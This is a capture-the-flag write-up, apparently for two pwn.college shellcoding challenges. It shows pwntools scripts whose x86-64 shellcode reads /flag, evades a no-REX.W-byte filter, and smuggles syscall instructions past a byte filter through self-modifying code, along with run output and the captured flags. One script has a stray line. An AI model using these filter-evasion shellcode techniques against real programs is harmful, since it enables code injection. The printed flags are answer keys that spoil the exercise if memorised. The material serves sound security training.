---
custom_edit_url: null
sidebar_position: 1
---

&nbsp;

## ello ackers!

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

```
hacker@program-security~ello-ackers:/$ /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.
```

Let's create our exploit script.

### Exploit

```py title="~/script" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    xor rdx, rdx
    mov rax, 2           
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov rdi, 1          
    mov rsi, rax
    mov rdx, 0
    mov r10, 0x100
    mov rax, 40          
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60            
    syscall

flag:
    .string "/flag"
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   48 8d 3d 3b 00 00 00    lea    rdi, [rip+0x3b]        # 0x42
   7:   31 f6                   xor    esi, esi
   9:   48 31 d2                xor    rdx, rdx
   c:   48 c7 c0 02 00 00 00    mov    rax, 0x2
  13:   0f 05                   syscall 
  15:   48 c7 c7 01 00 00 00    mov    rdi, 0x1
  1c:   48 89 c6                mov    rsi, rax
  1f:   48 c7 c2 00 00 00 00    mov    rdx, 0x0
  26:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  2d:   48 c7 c0 28 00 00 00    mov    rax, 0x28
  34:   0f 05                   syscall 
  36:   48 31 ff                xor    rdi, rdi
  39:   48 c7 c0 3c 00 00 00    mov    rax, 0x3c
  40:   0f 05                   syscall 
  42:   2f                      (bad)  
  43:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  45:   61                      (bad)  
  46:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

Failed filter at byte 0!
```

We can see that the program requires that our shell code has no `[REX.W prefix](https://en.wikipedia.org/wiki/REX_prefix)`.

```
## REX:
0100WRXB

## REX.W
0100 1000  = 0x48
```

A `REX.W` prefix is used to denote when an instruction uses 64-bit operands.

#### Without `REX.W` prefix

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
    syscall

    /* exit(0) */
    xor edi, edi
    mov al, 60
    syscall

flag:
    .string "/flag" 
"""

shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~ello-ackers:/$ python ~/script.py | /challenge/ello-ackers 
###
### Welcome to /challenge/ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x26e33000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 2b 00 00 00       lea    edi, [rip+0x2b]        # 0x31
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   0f 05                   syscall 
  11:   bf 01 00 00 00          mov    edi, 0x1
  16:   89 c6                   mov    esi, eax
  18:   ba 00 00 00 00          mov    edx, 0x0
  1d:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  24:   b8 28 00 00 00          mov    eax, 0x28
  29:   0f 05                   syscall 
  2b:   31 ff                   xor    edi, edi
  2d:   b0 3c                   mov    al, 0x3c
  2f:   0f 05                   syscall 
  31:   2f                      (bad)  
  32:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  34:   61                      (bad)  
  35:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000026e33000 | 8d 3d 2b 00 00 00                             | lea edi, [rip + 0x2b]
0x0000000026e33006 | 31 f6                                         | xor esi, esi
0x0000000026e33008 | 31 d2                                         | xor edx, edx
0x0000000026e3300a | b8 02 00 00 00                                | mov eax, 2
0x0000000026e3300f | 0f 05                                         | syscall 
0x0000000026e33011 | bf 01 00 00 00                                | mov edi, 1
0x0000000026e33016 | 89 c6                                         | mov esi, eax
0x0000000026e33018 | ba 00 00 00 00                                | mov edx, 0
0x0000000026e3301d | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000026e33024 | b8 28 00 00 00                                | mov eax, 0x28
0x0000000026e33029 | 0f 05                                         | syscall 
0x0000000026e3302b | 31 ff                                         | xor edi, edi
0x0000000026e3302d | b0 3c                                         | mov al, 0x3c
0x0000000026e3302f | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{Y0AomWBAdnyjKxZlzES4hSXCoU-.0FMyIDL4ITM0EzW}
```

&nbsp;

## Syscall Smuggler

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

```
hacker@program-security~syscall-smuggler:/$ /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.
```

We will have to create a self-modifying shellcode which will bypass the filters.
For this, we have to create a label that has the bytes, `0x0e` and `0x04`. 

```asm showLineNumbers
sys1:
    .byte 0x0e
    .byte 0x04
```

Before this label is executed, we have to increment the byte values so that they are `0x0f` and `0x05` which is the bytecode for `syscall`.
Our modifications should look something like this:

```asm title="syscall snippet" showLineNumbers
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]

sys1:
    .byte 0x0e
    .byte 0x04
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("/flag", 0, 0) */
    lea edi, [rip + flag]
    xor esi, esi
    xor edx, edx
    mov eax, 0x02
    
    /* syscall */
    inc byte ptr [rip + sys1 + 1]
    inc byte ptr [rip + sys1]
sys1:
    .byte 0x0e
    .byte 0x04        

    /* sendfile(1, rax, 0, 0x100) */
    mov edi, 1          
    mov esi, eax
    mov edx, 0
    mov r10, 0x100
    mov eax, 40          
 
    /* syscall */
    inc byte ptr [rip + sys2 + 1]
    inc byte ptr [rip + sys2]
sys2:
    .byte 0x0e
    .byte 0x04            

    /* exit(0) */
    xor edi, edi
    mov al, 60

    /* syscall */
    inc byte ptr [rip + sys3 + 1]
    inc byte ptr [rip + sys3]
sys3:
    .byte 0x0e
    .byte 0x04           

flag:
    .string "/flag" 
"""

process
shellcode = asm(shellcode_asm)
sys.stdout.buffer.write(shellcode)
print(disasm(shellcode), file=sys.stderr)
```

```
hacker@program-security~syscall-smuggler:/$ python ~/script.py | /challenge/syscall-smuggler 
###
### Welcome to /challenge/syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x286d6000!
Reading 0x1000 bytes from stdin.

   0:   8d 3d 4f 00 00 00       lea    edi, [rip+0x4f]        # 0x55
   6:   31 f6                   xor    esi, esi
   8:   31 d2                   xor    edx, edx
   a:   b8 02 00 00 00          mov    eax, 0x2
   f:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x1c
  15:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x1b
  1b:   0e                      (bad)  
  1c:   04 bf                   add    al, 0xbf
  1e:   01 00                   add    DWORD PTR [rax], eax
  20:   00 00                   add    BYTE PTR [rax], al
  22:   89 c6                   mov    esi, eax
  24:   ba 00 00 00 00          mov    edx, 0x0
  29:   49 c7 c2 00 01 00 00    mov    r10, 0x100
  30:   b8 28 00 00 00          mov    eax, 0x28
  35:   fe 05 07 00 00 00       inc    BYTE PTR [rip+0x7]        # 0x42
  3b:   fe 05 00 00 00 00       inc    BYTE PTR [rip+0x0]        # 0x41
  41:   0e                      (bad)  
  42:   04 31                   add    al, 0x31
  44:   ff b0 3c fe 05 07       push   QWORD PTR [rax+0x705fe3c]
  4a:   00 00                   add    BYTE PTR [rax], al
  4c:   00 fe                   add    dh, bh
  4e:   05 00 00 00 00          add    eax, 0x0
  53:   0e                      (bad)  
  54:   04 2f                   add    al, 0x2f
  56:   66 6c                   data16 ins BYTE PTR es:[rdi], dx
  58:   61                      (bad)  
  59:   67                      addr32
        ...
Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x00000000286d6000 | 8d 3d 4f 00 00 00                             | lea edi, [rip + 0x4f]
0x00000000286d6006 | 31 f6                                         | xor esi, esi
0x00000000286d6008 | 31 d2                                         | xor edx, edx
0x00000000286d600a | b8 02 00 00 00                                | mov eax, 2
0x00000000286d600f | fe 05 07 00 00 00                             | inc byte ptr [rip + 7]
0x00000000286d6015 | fe 05 00 00 00 00                             | inc byte ptr [rip]

Executing shellcode!

pwn.college{4rDXk944HRYc-LzoHZ_apv9MDgT.0VMyIDL4ITM0EzW}
```